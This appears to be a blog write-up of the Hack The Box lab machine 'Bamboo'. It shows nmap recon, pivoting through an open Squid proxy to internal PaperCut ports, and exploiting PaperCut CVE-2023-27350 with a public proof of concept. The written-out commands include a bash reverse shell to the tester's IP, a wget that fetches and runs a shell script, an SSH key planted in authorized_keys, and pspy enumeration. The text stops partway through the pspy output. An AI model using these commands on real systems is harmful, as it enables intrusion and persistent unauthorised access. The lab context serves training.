---
title: Bamboo
date: 2026-03-21
ShowToc: true
draft: false
TocOpen: true
tags:
  - blog
  - HTB
lastmod: 2026-03-22T16:35:41.391Z
---
# Box Info

{{< htb-info "https://www.hackthebox.com/machines/Bamboo" >}}

***

```console
tester@linux:~/Desktop$ whoami 
```

```bash
tester@linux:~$
```

```shell
tester@linux:~$
```

```console
tester@linux:~$
```

```console
tester@linux:/$ proxychains -q python3 CVE-2023-27350.py.1 -u
```

```console
~ proxychains -q python3 CVE-2023-27350.py.1 -u 
```

```console
> ~/Desktop$ whoami
```

# Recon 10.129.234.X

### \[\[PORT & IP SCAN]]

The `nmap` reveal that the machine has the port of 22 and 3128 for squid-http , remember to use the `--min-rate` , otherwise , the `nmap` scan can scan for 1 day

```console
test $ sudo nmap  -p-  -vv -reason -T 5  -o openPort.txt 10.129.238.16 --min-rate 500
Nmap scan report for 10.129.238.16
Host is up, received echo-reply ttl 63 (0.66s latency).
Scanned at 2026-03-16 07:30:34 HKT for 395s
Not shown: 65533 filtered tcp ports (no-response)
PORT     STATE SERVICE    REASON
22/tcp   open  ssh        syn-ack ttl 63
3128/tcp open  squid-http syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 394.73 seconds
           Raw packets sent: 196871 (8.662MB) | Rcvd: 270 (11.864KB)
       


parallels@ubuntu-linux-2404:~/Desktop$ sudo nmap -sC -sV -p $(grep -Eo '^[0-9]+/tcp' openPort.txt | cut -d/ -f1 | paste -sd, -) -T4 10.129.238.16  -oN serviceScan.txt
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-03-16 07:38 HKT
Nmap scan report for 10.129.238.16
Host is up (0.32s latency).

PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 83:b2:62:7d:9c:9c:1d:1c:43:8c:e3:e3:6a:49:f0:a7 (ECDSA)
|_  256 cf:48:f5:f0:a6:c1:f5:cb:f8:65:18:95:43:b4:e7:e4 (ED25519)
3128/tcp open  http-proxy Squid http proxy 5.9
|_http-title: ERROR: The requested URL could not be retrieved
|_http-server-header: squid/5.9
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 45.47 seconds    
           
```

### SSH 22

The SSH is the 3ubuntu0 for the Linux , nothing find in here

### 3128/tcp

The (VerylazyTech)\[https://www.verylazytech.com/squid-port-3128] say that **Port 3128** is widely associated with **Squid**, a caching and forwarding HTTP web proxy. While it can improve performance and control web access, misconfigured instances can expose systems to security vulnerabilities. In this article, we’ll explore how to identify, assess, and safely exploit Squid proxies during a penetration test—strictly in authorized environments.

Base on HackTrick\[https://hacktricks.wiki/en/network-services-pentesting/3128-pentesting-squid.html] to pentest it

```console
tester@linux$ git clone https://github.com/aancw/spose.git
Cloning into 'spose'...
remote: Enumerating objects: 34, done.
remote: Counting objects: 100% (23/23), done.
remote: Compressing objects: 100% (16/16), done.
remote: Total 34 (delta 11), reused 17 (delta 6), pack-reused 11 (from 1)
Receiving objects: 100% (34/34), 7.89 KiB | 1.58 MiB/s, done.
Resolving deltas: 100% (11/11), done.
parallels@ubuntu-linux-2404:~/Desktop$ cd spose/
parallels@ubuntu-linux-2404:~/Desktop/spose$ uv add --script spose.py -r requirements.txt
Resolved 1 package in 756ms
parallels@ubuntu-linux-2404:~/Desktop/spose$ uv run spose.py --proxy http://10.129.238.16:3128 --target localhost --allports
Installed 1 package in 5ms
Scanning all 65,535 TCP ports
Using proxy address http://10.129.238.16:3128
localhost:22 seems OPEN
localhost:9191 seems OPEN
localhost:9192 seems OPEN
localhost:9195 seems OPEN
```

**Proxychains for HTTP interaction:** append a strict HTTP entry at the bottom of `/etc/proxychains.conf`:

```
[ProxyList]
http    10.129.238.16   3128
```

![Pasted image 20260321124035.png](/ob/Pasted%20image%2020260321124035.png)

Then interact with internal listeners (e.g., a web UI bound to 127.0.0.1) transparently through Squid:

```console
$ proxychains curl http://127.0.0.1:9191 -v
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/aarch64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
*   Trying 127.0.0.1:9191...
[proxychains] Strict chain  ...  10.129.238.16:3128  ...  127.0.0.1:9191  ...  OK
* Established connection to 127.0.0.1 (127.0.0.1 port 9191) from 10.10.16.4 port 38250 
* using HTTP/1.x
> GET / HTTP/1.1
> Host: 127.0.0.1:9191
> User-Agent: curl/8.18.0
> Accept: */*
> 
* Request completely sent off
< HTTP/1.1 302 Found
< Date: Sat, 21 Mar 2026 04:42:27 GMT
< Location: http://127.0.0.1:9191/user
< Content-Length: 0
< 
* Connection #0 to host 127.0.0.1:9191 left intact
```

I already have my [Firefox set up with FoxyProxy](https://www.youtube.com/watch?v=iTm33Miymdg) to proxy all my CTF traffic through Burp. I’ll go into Burp –> Proxy –> Settings –> Network –> Connections –> Upstream proxy servers and add this Squid instance:

![Pasted image 20260321124926.png](/ob/Pasted%20image%2020260321124926.png)

![Pasted image 20260321125201.png](/ob/Pasted%20image%2020260321125201.png)

![Pasted image 20260321130822.png](/ob/Pasted%20image%2020260321130822.png)

Let me find the `PaperCut NG 22.0` ' s CVE

https://github.com/horizon3ai/CVE-2023-27350\
POC\
![Pasted image 20260321133135.png](/ob/Pasted%20image%2020260321133135.png)

```console
tester@linux$ proxychains -q  python3 CVE-2023-27350.py.1 -u http://127.0.0.1:9191/ -c 'curl http://10.10.16.4'
[*] Papercut instance is vulnerable! Obtained valid JSESSIONID
[*] Updating print-and-device.script.enabled to Y
[*] Updating print.script.sandboxed to N
[*] Prepparing to execute...
[+] Executed successfully!
[*] Updating print-and-device.script.enabled to N
[*] Updating print.script.sandboxed to Y
```

```
tester@linux$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.129.238.16 - - [21/Mar/2026 13:29:25] "GET / HTTP/1.1" 200 -
```

```
python3 -m http.server 80
```

Create the shell

```
#!/bin/bash
bash -i >& /dev/tcp/10.10.16.4/80 0>&1
```

download the shell

```
tester@linux$ proxychains -q  python3 CVE-2023-27350.py.1 -u http://127.0.0.1:9191/ -c 'wget http://10.10.16.4:80/shell.sh -O /tmp/shell.sh'
[*] Papercut instance is vulnerable! Obtained valid JSESSIONID
[*] Updating print-and-device.script.enabled to Y
[*] Updating print.script.sandboxed to N
[*] Prepparing to execute...
[+] Executed successfully!
[*] Updating print-and-device.script.enabled to N
[*] Updating print.script.sandboxed to Y
```

start the revshell

```
sudo nc -lvnp 80 
```

```
tester@linux$ proxychains -q  python3 CVE-2023-27350.py.1 -u http://127.0.0.1:9191/ -c 'bash /tmp/shell.sh'
[*] Papercut instance is vulnerable! Obtained valid JSESSIONID
[*] Updating print-and-device.script.enabled to Y
[*] Updating print.script.sandboxed to N
[*] Prepparing to execute...
[+] Executed successfully!
[*] Updating print-and-device.script.enabled to N
[*] Updating print.script.sandboxed to Y
```

```
tester@linux$ ssh-keygen -t ed25519 -C "haydon@kali-$(date +%Y%m%d)"
Generating public/private ed25519 key pair.
Enter file in which to save the key (/home/parallels/.ssh/id_ed25519): 
/home/parallels/.ssh/id_ed25519 already exists.
Overwrite (y/n)? y
Enter passphrase for "/home/parallels/.ssh/id_ed25519" (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in /home/parallels/.ssh/id_ed25519
Your public key has been saved in /home/parallels/.ssh/id_ed25519.pub
The key fingerprint is:
SHA256:/zNh5RrEzhD4IfFZr3NYShyBgaVUzgiukplJs7Xt8Mo haydon@kali-20260321
The key's randomart image is:
+--[ED25519 256]--+
|      . o*+o+.   |
|     . o+*++ o   |
|  o . . oo=+o o  |
| . O +    o.o=.  |
|  B + . S  ==o.  |
|   . +   .  *o.  |
|      o   .. +   |
|   . .     .+    |
|    E       .o   |
+----[SHA256]-----+
```

```
tester@linux$ ls ~/.ssh                                                           
id_ed25519  id_ed25519.pub
                                                                                                                                                                             
tester@linux$ cd ~/.ssh             
                                                                                tester@linux$ cat id_ed25519.pub 
ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKM1/F1Xu38W1tZp67JhMCEUxH6ati6tvd850oRkaZeV haydon@kali-20260321
                                                                            

```

```
tester@linux$ echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKM1/F1Xu38W1tZp67JhMCEUxH6ati6tvd850oRkaZeV haydon@kali-20260321' > authorized_keys
<d850oRkaZeV haydon@kali-20260321' > authorized_keys
papercut@bamboo:~/.ssh$ ls
ls
authorized_keys
papercut@bamboo:~/.ssh$ 
```

```
tester@linux$ ssh -i ~/.ssh/id_ed25519 papercut@10.129.238.16       
Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 6.8.0-1039-aws x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Sat Mar 21 06:13:10 UTC 2026

  System load:  0.18              Processes:             157
  Usage of /:   58.5% of 6.60GB   Users logged in:       0
  Memory usage: 52%               IPv4 address for eth0: 10.129.238.16
  Swap usage:   0%


Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update


The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

papercut@bamboo:~$ 

```

### Enumeration

```
wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy64
python3 -m http.server 80 
10.129.238.16 - - [21/Mar/2026 14:43:15] "GET /pspy64 HTTP/1.1" 200 -

```

```shell

Last login: Sat Mar 21 06:13:12 2026 from 10.10.16.4
papercut@bamboo:~$ 
papercut@bamboo:~$ 
papercut@bamboo:~$ 
papercut@bamboo:~$ ls
LICENCE.TXT                  client     pspy64   server     yes
README-LINUX.TXT             docs       release  uninstall  yes.pub
THIRDPARTYLICENSEREADME.TXT  providers  runtime  user.txt
papercut@bamboo:~$ timeout  120 ./pspy64  -pf -i 1000
pspy - version: v1.2.1 - Commit SHA: f9e6a1590a4312b9faa093d8dc84e19567977a6d


     ██▓███    ██████  ██▓███ ▓██   ██▓
    ▓██░  ██▒▒██    ▒ ▓██░  ██▒▒██  ██▒
    ▓██░ ██▓▒░ ▓██▄   ▓██░ ██▓▒ ▒██ ██░
    ▒██▄█▓▒ ▒  ▒   ██▒▒██▄█▓▒ ▒ ░ ▐██▓░
    ▒██▒ ░  ░▒██████▒▒▒██▒ ░  ░ ░ ██▒▓░
    ▒▓▒░ ░  ░▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░  ██▒▒▒ 
    ░▒ ░     ░ ░▒  ░ ░░▒ ░     ▓██ ░▒░ 
    ░░       ░  ░  ░  ░░       ▒ ▒ ░░  
                   ░           ░ ░     
                               ░ ░     

Config: Printing events (colored=true): processes=true | file-system-events=true ||| Scanning for processes every 1s and on inotify events ||| Watching directories: [/usr /tmp /etc /home /var /opt] (recursive) | [] (non-recursive)
Draining file system events due to startup...
done                                                                                                                                             
2026/03/21 06:45:25 CMD: UID=0     PID=33271  | /snap/amazon-ssm-agent/11797/amazon-ssm-agent                                                    
2026/03/21 06:45:25 CMD: UID=1001  PID=33263  | ./pspy64 -pf -i 1000                                                                             
2026/03/21 06:45:25 CMD: UID=1001  PID=33262  | timeout 120 ./pspy64 -pf -i 1000                                                                 
2026/03/21 06:45:25 CMD: UID=1001  PID=33176  | -bash                                                                                            
2026/03/21 06:45:25 CMD: UID=1001  PID=33147  | sshd: papercut@pts/0                                                                                                                                                                                                                              
2026/03/21 06:45:25 CMD: UID=1001  PID=33085  | (sd-pam)                                                                                         
2026/03/21 06:45:25 CMD: UID=1001  PID=33084  | /lib/systemd/systemd --user                                                                      
2026/03/21 06:45:25 CMD: UID=0     PID=33082  |                                                                                                  
2026/03/21 06:45:25 CMD: UID=0     PID=33051  | sshd: papercut [priv]                                                                                                                                                                                                                             
2026/03/21 06:45:25 CMD: UID=0     PID=33022  |                                                                                                  
2026/03/21 06:45:25 CMD: UID=0     PID=32737  |                                                                                                  
2026/03/21 06:45:25 CMD: UID=0     PID=32183  |                                                                                                  
2026/03/21 06:45:25 CMD: UID=0     PID=30835  |                                                                                                  
2026/03/21 06:45:25 CMD: UID=0     PID=30220  |                                                                                                  
2026/03/21 06:45:25 CMD: UID=0     PID=30012  |                                                                                                  
2026/03/21 06:45:25 CMD: UID=0     PID=29485  |                                                                                                  
2026/03/21 06:45:25 CMD: UID=0     PID=28937  |                                                                                                  
2026/03/21 06:45:25 CMD: UID=0     PID=27699  |                                                                                                  
2026/03/21 06:45:25 CMD: UID=0     PID=26332  |                                                                                                  
2026/03/21 06:45:25 CMD: UID=0     PID=26331  | 
2026/03/21 06:45:25 CMD: UID=0     PID=25447  | 
2026/03/21 06:45:25 CMD: UID=0     PID=22759  | 
2026/03/21 06:45:25 CMD: UID=0     PID=10411  | 
2026/03/21 06:45:25 CMD: UID=13    PID=870    | (pinger) 
2026/03/21 06:45:25 CMD: UID=13    PID=865    | (logfile-daemon) /var/log/squid/access.log 
2026/03/21 06:45:25 CMD: UID=13    PID=850    | (squid-1) --kid squid-1 --foreground -sYC 
2026/03/21 06:45:25 CMD: UID=0     PID=831    | sshd: /usr/sbin/sshd -D -o AuthorizedKeysCommand /usr/share/ec2-instance-connect/eic_run_authorized_keys %u %f -o AuthorizedKeysCommandUser ec2-instance-connect [listener] 0 of 10-100 startups                                                  
2026/03/21 06:45:25 CMD: UID=1001  PID=830    | ../runtime/linux-x64/jre/bin/pc-app -Djava.io.tmpdir=tmp -Dserver.home=. -Xverify:none -XX:+UseParallelOldGC -server -Dpc-reserved=X -Djava.locale.providers=COMPAT,SPI -Dpc-reserved=X -Dpc-reserved=X -Dpc-reserved=X -Djava.awt.headless=true -XX:-UseBiasedLocking -Xlog:gc*,heap*,safepoint*=info:file=logs/gc.log:time,uptime:filecount=10,filesize=1m -Dpc-reserved=X -Dpc-reserved=X -Dpc-reserved=X -Dpc-reserved=X -Dpc-reserved=X -Dpc-reserved=X -Dpc-reserved=X -Dkeystore.pkcs12.legacy -Dlog4j.configurationFile=file:lib/log4j2.properties -Djava.library.path=bin/linux-x64/lib -classpath bin/linux-x64/lib/wrapper-3.2.3.jar:lib:lib/OXPdLib-1.8.1.jar:lib/kotlin-stdlib-1.3.72.jar:lib/transaction-api-1.1.jar:lib/j2objc-annotations-1.3.jar:lib/toshiba-sdk-soap-4.3.0.jar:lib/commons-digester-2.1.jar:lib/snmp-1.4.2b.jar:lib/fontbox-2.0.26.jar:lib/jcommon-1.0.23.jar:lib/spring-web-4.3.30.RELEASE.jar:lib/asm-commons-9.2.jar:lib/grpc-context-1.22.1.jar:lib/http-2.1.10.jar:lib/stax-ex-2.1.10.jar:lib/google-oauth-client-1.31.2.jar:lib/streambuffer-2.1.10.jar:lib/metrics-annotation-3.2.6.jar:lib/papercut-common-22.0.6.64379.jar:lib/javase-3.3.3.jar:lib/jsr311-api-1.1.1.jar:lib/google-http-client-gson-1.38.0.jar:lib/google-http-client-1.38.0.jar:lib/ecj-4.4.2.jar:lib/google-oauth-client-servlet-1.31.2.jar:lib/apache-jsp-9.4.44.v20210927.jar:lib/apache-el-8.5.70.jar:lib/commons-el-1.0.jar:lib/jetty-webapp-9.4.44.v20210927.jar:lib/jtds-1.3.1.with-ssl-patch.jar:lib/apacheds-all-1.5.5-pc-v2.jar:lib/google-api-services-gmail-v1-rev20210111-1.31.0.jar:lib/animal-sniffer-annotations-1.17.jar:lib/log4j-slf4j-impl-2.17.1.jar:lib/hibernate-core-3.6.10.Final.jar:lib/bcpkix-jdk15on-1.66.jar:lib/javax.mail-1.5.6.jar:lib/caffeine-2.6.2.jar:lib/asm-tree-9.2.jar:lib/pdfbox-2.0.26.jar:lib/jetty-continuation-9.4.44.v20210927.jar:lib/aopalliance-1.0.jar:lib/google-auth-library-credentials-0.22.2.jar:lib/quartz-2.2.3.jar:lib/paranamer-2.8.jar:lib/fuji-xerox-apeos-soap-2.0.2.jar:lib/jfreechart-1.0.19.jar:lib/spring-security-oauth2-2.3.8.RELEASE.jar:lib/j                                                                               
2026/03/21 06:45:25 CMD: UID=0     PID=828    | /usr/sbin/squid --foreground -sYC 
2026/03/21 06:45:25 CMD: UID=114   PID=824    | /usr/sbin/chronyd -F 1 
2026/03/21 06:45:25 CMD: UID=1001  PID=820    | /home/papercut/server/bin/linux-x64/./app-monitor /home/papercut/server/bin/linux-x64/./app-monitor.conf wrapper.syslog.ident=papercut-app-server wrapper.pidfile=/home/papercut/server/bin/linux-x64/../../logs/papercut-app-server.pid          
2026/03/21 06:45:25 CMD: UID=114   PID=819    | /usr/sbin/chronyd -F 1 
2026/03/21 06:45:25 CMD: UID=0     PID=767    | /sbin/agetty -o -p -- \u --noclear tty1 linux 
2026/03/21 06:45:25 CMD: UID=1001  PID=724    | /usr/bin/perl /home/papercut/providers/web-print/linux-x64/pc-web-print 
2026/03/21 06:45:25 CMD: UID=1001  PID=723    | /bin/sh /home/papercut/server/bin/linux-x64/app-server startd 
2026/03/21 06:45:25 CMD: UID=0     PID=722    | /usr/sbin/cron -f -P 
2026/03/21 06:45:25 CMD: UID=0     PID=557    | v2023-02-14-1341/pc-print-deploy-server -dataDir=/home/papercut/providers/print-deploy/linux-x64//data -pclog.dev                                                                                                                                 
2026/03/21 06:45:25 CMD: UID=0     PID=528    | /lib/systemd/systemd-logind 
2026/03/21 06:45:25 CMD: UID=0     PID=527    | /usr/lib/snapd/snapd 
2026/03/21 06:45:25 CMD: UID=104   PID=524    | /usr/sbin/rsyslogd -n -iNONE 
2026/03/21 06:45:25 CMD: UID=0     PID=523    | /home/papercut/providers/print-deploy/linux-x64/pc-print-deploy 
2026/03/21 06:45:25 CMD: UID=0     PID=522    | /usr/bin/python3 /usr/bin/networkd-dispatcher --run-startup-triggers 
2026/03/21 06:45:25 CMD: UID=0     PID=521    | /usr/sbin/irqbalance --foreground 
2026/03/21 06:45:25 CMD: UID=102   PID=515    | @dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only 
2026/03/21 06:45:25 CMD: UID=0     PID=514    | /usr/sbin/acpid 
2026/03/21 06:45:25 CMD: UID=0     PID=468    | /sbin/dhclient -1 -4 -v -i -pf /run/dhclient.eth0.pid -lf /var/lib/dhcp/dhclient.eth0.leases -I -df /var/lib/dhcp/dhclient6.eth0.leases eth0                                                                                                      
2026/03/21 06:45:25 CMD: UID=0     PID=436    | 
2026/03/21 06:45:25 CMD: UID=998   PID=370    | /usr/local/sbin/laurel --config /etc/laurel/config.toml 
2026/03/21 06:45:25 CMD: UID=0     PID=367    | /sbin/auditd 
2026/03/21 06:45:25 CMD: UID=0     PID=352    | /usr/bin/vmtoolsd 
2026/03/21 06:45:25 CMD: UID=0     PID=351    | /usr/bin/VGAuthService 
2026/03/21 06:45:25 CMD: UID=101   PID=350    | /lib/systemd/systemd-resolved 
2026/03/21 06:45:25 CMD: UID=0     PID=230    | 
2026/03/21 06:45:25 CMD: UID=0     PID=224    | 
2026/03/21 06:45:25 CMD: UID=0     PID=223    | 
2026/03/21 06:45:25 CMD: UID=0     PID=221    | 
2026/03/21 06:45:25 CMD: UID=0     PID=189    | /lib/systemd/systemd-udevd 
2026/03/21 06:45:25 CMD: UID=0     PID=186    | /sbin/multipathd -d -s 
2026/03/21 06:45:25 CMD: UID=0     PID=185    | 
2026/03/21 06:45:25 CMD: UID=0     PID=184    | 
2026/03/21 06:45:25 CMD: UID=0     PID=183    | 
2026/03/21 06:45:25 CMD: UID=0     PID=182    | 
2026/03/21 06:45:25 CMD: UID=0     PID=150    | /lib/systemd/systemd-journald 
2026/03/21 06:45:25 CMD: UID=0     PID=122    | 
2026/03/21 06:45:25 CMD: UID=0     PID=121    | 
2026/03/21 06:45:25 CMD: UID=0     PID=120    | 
2026/03/21 06:45:25 CMD: UID=0     PID=119    | 
2026/03/21 06:45:25 CMD: UID=0     PID=105    | 
2026/03/21 06:45:25 CMD: UID=0     PID=103    | 
2026/03/21 06:45:25 CMD: UID=0     PID=96     | 
2026/03/21 06:45:25 CMD: UID=0     PID=95     | 
2026/03/21 06:45:25 CMD: UID=0     PID=93     | 
2026/03/21 06:45:25 CMD: UID=0     PID=92     | 
2026/03/21 06:45:25 CMD: UID=0     PID=91     | 
2026/03/21 06:45:25 CMD: UID=0     PID=90     | 
2026/03/21 06:45:25 CMD: UID=0     PID=89     | 
2026/03/21 06:45:25 CMD: UID=0     PID=88     | 
2026/03/21 06:45:25 CMD: UID=0     PID=87     | 
2026/03/21 06:45:25 CMD: UID=0     PID=86     | 
2026/03/21 06:45:25 CMD: UID=0     PID=85     | 
2026/03/21 06:45:25 CMD: UID=0     PID=84     | 
2026/03/21 06:45:25 CMD: UID=0     PID=83     | 
2026/03/21 06:45:25 CMD: UID=0     PID=82     | 
2026/03/21 06:45:25 CMD: UID=0     PID=81     | 
2026/03/21 06:45:25 CMD: UID=0     PID=80     | 
2026/03/21 06:45:25 CMD: UID=0     PID=79     | 
2026/03/21 06:45:25 CMD: UID=0     PID=78     | 
2026/03/21 06:45:25 CMD: UID=0     PID=77     | 
2026/03/21 06:45:25 CMD: UID=0     PID=76     | 
2026/03/21 06:45:25 CMD: UID=0     PID=75     | 
2026/03/21 06:45:25 CMD: UID=0     PID=74     | 
2026/03/21 06:45:25 CMD: UID=0     PID=73     | 
2026/03/21 06:45:25 CMD: UID=0     PID=72     | 
2026/03/21 06:45:25 CMD: UID=0     PID=71     | 
2026/03/21 06:45:25 CMD: UID=0     PID=70     | 
2026/03/21 06:45:25 CMD: UID=0     PID=69     | 
2026/03/21 06:45:25 CMD: UID=0     PID=68     | 
2026/03/21 06:45:25 CMD: UID=0     PID=67     | 
2026/03/21 06:45:25 CMD: UID=0     PID=66     | 
2026/03/21 06:45:25 CMD: UID=0     PID=65     | 
2026/03/21 06:45:25 CMD: UID=0     PID=64     | 
2026/03/21 06:45:25 CMD: UID=0     PID=63     | 
2026/03/21 06:45:25 CMD: UID=0     PID=62     | 
2026/03/21 06:45:25 CMD: UID=0     PID=61     | 
2026/03/21 06:45:25 CMD: UID=0     PID=60     | 
2026/03/21 06:45:25 CMD: UID=0     PID=59     | 
2026/03/21 06:45:25 CMD: UID=0     PID=58     | 
2026/03/21 06:45:25 CMD: UID=0     PID=57     | 
2026/03/21 06:45:25 CMD: UID=0     PID=56     | 
2026/03/21 06:45:25 CMD: UID=0     PID=55     | 
2026/03/21 06:45:25 CMD: UID=0     PID=54     | 
2026/03/21 06:45:25 CMD: UID=0     PID=53     | 
2026/03/21 06:45:25 CMD: UID=0     PID=52     | 
2026/03/21 06:45:25 CMD: UID=0     PID=51     | 
2026/03/21 06:45:25 CMD: UID=0     PID=50     | 
2026/03/21 06:45:25 CMD: UID=0     PID=48     | 
2026/03/21 06:45:25 CMD: UID=0     PID=47     | 
2026/03/21 06:45:25 CMD: UID=0     PID=46     | 
2026/03/21 06:45:25 CMD: UID=0     PID=45     | 
2026/03/21 06:45:25 CMD: UID=0     PID=44     | 
2026/03/21 06:45:25 CMD: UID=0     PID=43     | 
2026/03/21 06:45:25 CMD: UID=0     PID=42     | 
2026/03/21 06:45:25 CMD: UID=0     PID=41     | 
2026/03/21 06:45:25 CMD: UID=0     PID=40     | 
2026/03/21 06:45:25 CMD: UID=0     PID=39     | 
2026/03/21 06:45:25 CMD: UID=0     PID=38     | 
2026/03/21 06:45:25 CMD: UID=0     PID=37     | 
2026/03/21 06:45:25 CMD: UID=0     PID=35     | 
2026/03/21 06:45:25 CMD: UID=0     PID=34     | 
2026/03/21 06:45:25 CMD: UID=0     PID=33     | 
2026/03/21 06:45:25 CMD: UID=0     PID=32     | 
2026/03/21 06:45:25 CMD: UID=0     PID=29     | 
2026/03/21 06:45:25 CMD: UID=0     PID=28     | 
2026/03/21 06:45:25 CMD: UID=0     PID=27     | 
2026/03/21 06:45:25 CMD: UID=0     PID=26     | 
2026/03/21 06:45:25 CMD: UID=0     PID=25     | 
2026/03/21 06:45:25 CMD: UID=0     PID=23     | 
2026/03/21 06:45:25 CMD: UID=0     PID=22     | 
2026/03/21 06:45:25 CMD: UID=0     PID=21     | 
2026/03/21 06:45:25 CMD: UID=0     PID=20     | 
2026/03/21 06:45:25 CMD: UID=0     PID=19     | 
2026/03/21 06:45:25 CMD: UID=0     PID=18     | 
2026/03/21 06:45:25 CMD: UID=0     PID=17     | 
2026/03/21 06:45:25 CMD: UID=0     PID=16     | 
2026/03/21 06:45:25 CMD: UID=0     PID=15     | 
2026/03/21 06:45:25 CMD: UID=0     PID=14     | 
2026/03/21 06:45:25 CMD: UID=0     PID=13     | 
2026/03/21 06:45:25 CMD: UID=0     PID=12     | 
2026/03/21 06:45:25 CMD: UID=0     PID=7      | 
2026/03/21 06:45:25 CMD: UID=0     PID=6      | 
2026/03/21 06:45:25 CMD: UID=0     PID=5      | 
2026/03/21 06:45:25 CMD: UID=0     PID=4      | 
2026/03/21 06:45:25 CMD: UID=0     PID=3      | 
2026/03/21 06:45:25 CMD: UID=0     PID=2      | 
2026/03/21 06:45:25 CMD: UID=0     PID=1      | /sbin/init 
2026/03/21 06:45:25 FS:                 OPEN | /usr/share/zoneinfo/Etc/UTC
2026/03/21 06:45:25 FS:               ACCESS | /usr/share/zoneinfo/Etc/UTC
2026/03/21 06:45:25 FS:        CLOSE_NOWRITE | /usr/share/zoneinfo/Etc/UTC
2026/03/21 06:45:25 FS:               MODIFY | /var/log/laurel/audit.log
2026/03/21 06:45:26 FS:               MODIFY | /var/log/journal/ec24bb3c93c763aec32587112a07e891/system.journal
2026/03/21 06:45:26 FS:               MODIFY | /var/log/syslog
2026/03/21 06:45:26 FS:               MODIFY | /var/log/syslog
2026/03/21 06:45:27 FS:               MODIFY | /var/log/syslog
2026/03/21 06:45:27 FS:               MODIFY | /var/log/syslog
2026/03/21 06:45:27 FS:               MODIFY | /var/log/journal/ec24bb3c93c763aec32587112a07e891/system.journal
2026/03/21 06:45:27 FS:               MODIFY | /var/log/syslog
2026/03/21 06:45:27 FS:               MODIFY | /var/log/syslog
2026/03/21 06:45:27 FS:               MODIFY | /var/log/laurel/audit.log
2026/03/21 06:45:27 FS:               MODIFY | /var/log/journal/ec24bb3c93c763aec32587112a07e891/system.journal
2026/03/21 06:45:27 FS:               MODIFY | /var/log/syslog
2026/03/21 06:45:27 FS:               MODIFY | /var/log/journal/ec24bb3c93c763aec32587112a07e891/system.journal
2026/03/21 06:45:27 FS:             OPEN DIR | /home/papercut/server
2026/03/21 06:45:27 FS:             OPEN DIR | /home/papercut/server/
2026/03/21 06:45:27 FS:           ACCESS DIR | /home/papercut/server
2026/03/21 06:45:27 FS:           ACCESS DIR | /home/papercut/server/
2026/03/21 06:45:27 FS:           ACCESS DIR | /home/papercut/server
2026/03/21 06:45:27 FS:           ACCESS DIR | /home/papercut/server/
2026/03/21 06:45:27 FS:    CLOSE_NOWRITE DIR | /home/papercut/server
2026/03/21 06:45:27 FS:    CLOSE_NOWRITE DIR | /home/papercut/server/
2026/03/21 06:45:28 FS:               MODIFY | /var/log/laurel/audit.log
2026/03/21 06:45:28 FS:               CREATE | /home/papercut/server/data/internal/state/systemstate/job-authentication.new.ser
2026/03/21 06:45:28 FS:                 OPEN | /home/papercut/server/data/internal/state/systemstate/job-authentication.new.ser
2026/03/21 06:45:28 FS:               MODIFY | /home/papercut/server/data/internal/state/systemstate/job-authentication.new.ser
2026/03/21 06:45:28 FS:          CLOSE_WRITE | /home/papercut/server/data/internal/state/systemstate/job-authentication.new.ser
2026/03/21 06:45:28 FS:               DELETE | /home/papercut/server/data/internal/state/systemstate/job-authentication.curr.ser
2026/03/21 06:45:28 FS:           MOVED_FROM | /home/papercut/server/data/internal/state/systemstate/job-authentication.new.ser
2026/03/21 06:45:28 FS:             MOVED_TO | /home/papercut/server/data/internal/state/systemstate/job-authentication.curr.ser
2026/03/21 06:45:28 FS:               CREATE | /home/papercut/server/data/internal/state/systemstate/user-client-data.new.ser
2026/03/21 06:45:28 FS:                 OPEN | /home/papercut/server/data/internal/state/systemstate/user-client-data.new.ser
2026/03/21 06:45:28 FS:               MODIFY | /home/papercut/server/data/internal/state/systemstate/user-client-data.new.ser
2026/03/21 06:45:28 FS:          CLOSE_WRITE | /home/papercut/server/data/internal/state/systemstate/user-client-data.new.ser
2026/03/21 06:45:28 FS:               DELETE | /home/papercut/server/data/internal/state/systemstate/user-client-data.curr.ser
2026/03/21 06:45:28 FS:           MOVED_FROM | /home/papercut/server/data/internal/state/systemstate/user-client-data.new.ser
2026/03/21 06:45:28 FS:             MOVED_TO | /home/papercut/server/data/internal/state/systemstate/user-client-data.curr.ser
2026/03/21 06:45:28 FS:               CREATE | /home/papercut/server/data/internal/state/systemstate/script-state.new.ser
2026/03/21 06:45:28 FS:                 OPEN | /home/papercut/server/data/internal/state/systemstate/script-state.new.ser
2026/03/21 06:45:28 FS:               MODIFY | /home/papercut/server/data/internal/state/systemstate/script-state.new.ser
2026/03/21 06:45:28 FS:          CLOSE_WRITE | /home/papercut/server/data/internal/state/systemstate/script-state.new.ser
2026/03/21 06:45:28 FS:               DELETE | /home/papercut/server/data/internal/state/systemstate/script-state.curr.ser
2026/03/21 06:45:28 FS:           MOVED_FROM | /home/papercut/server/data/internal/state/systemstate/script-state.new.ser
